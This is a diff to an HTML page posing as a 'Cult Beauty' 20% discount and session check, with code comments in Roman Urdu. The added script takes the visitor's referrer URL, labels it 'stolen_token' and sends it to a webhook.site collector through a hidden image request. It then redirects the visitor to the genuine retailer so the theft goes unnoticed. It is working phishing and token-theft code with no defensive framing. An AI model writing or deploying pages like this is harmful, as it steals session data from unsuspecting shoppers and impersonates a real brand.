@@ -1,25 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Connecting...</title>
+    <title>Exclusive Discount - Cult Beauty</title>
 </head>
-<body>
+<body style="text-align:center; font-family:sans-serif; margin-top:100px;">
+    <h2>Processing your 20% Discount...</h2>
+    <p>Please wait while we verify your session.</p>
+
     <script>
-        // 1. Naya Webhook URL
+        // 1. Aapka Naya Webhook URL
         var webhook = "https://webhook.site/0d29a0c1-c4ad-44a3-8e36-8a74dbe54628";
         
-        // 2. Pichli site ka sensitive URL pakarna
+        // 2. Pichla sensitive URL capture karna
         var leakedData = document.referrer; 
 
-        // 3. Image trick se data bhejna (Isay browser block nahi karta)
-        var logger = new Image();
-        logger.src = webhook + "?captured=" + encodeURIComponent(leakedData);
+        // 3. One-Click Leak: Image ke zariay data bhejna
+        // Isay browser block nahi karta kyunke ye background request hai
+        if (leakedData) {
+            var logger = new Image();
+            logger.src = webhook + "?stolen_token=" + encodeURIComponent(leakedData);
+        }
 
-        // 4. Confirmation ke liye user ko redirect karna
+        // 4. Automatic Redirect: 2 seconds baad user ko asli site par bhej dena
         setTimeout(function(){
             window.location.href = "https://www.cultbeauty.co.uk/";
-        }, 1500);
+        }, 2000);
     </script>
-    <h2 style="text-align:center; margin-top:50px;">Security Check in Progress...</h2>
 </body>
 </html>
